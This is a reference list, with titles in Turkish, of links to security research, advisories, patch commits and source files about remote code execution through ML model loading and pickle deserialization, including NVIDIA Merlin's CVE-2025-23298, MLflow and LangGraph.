- [5] [ZDI blog – CVE-2025-23298: NVIDIA Merlin'de Remote Code Execution elde etme](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI güvenlik duyurusu: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec yama commit'i b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Yama öncesi savunmasız loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kötü amaçlı checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Yama sonrası loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Modern AI/ML formatları ve kütüphaneleriyle Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate belgeleri](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit'i (RCE uyarısı)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi'den RCE'ye: LangGraph'ın Checkpointer'ını istismar etme](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip hatalarını yüksek değerli AI/ML bounty'lerine dönüştürme](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk güvenlik duyurusu ve PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow kaynak kodu – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact indirme ve yükleme endpoint'leri](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer statik tarayıcı atlatma taksonomisi](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer ile kötü amaçlı model tespiti](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` uygulaması](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` uyumluluk eşlemesi](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` import eşlemesi](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
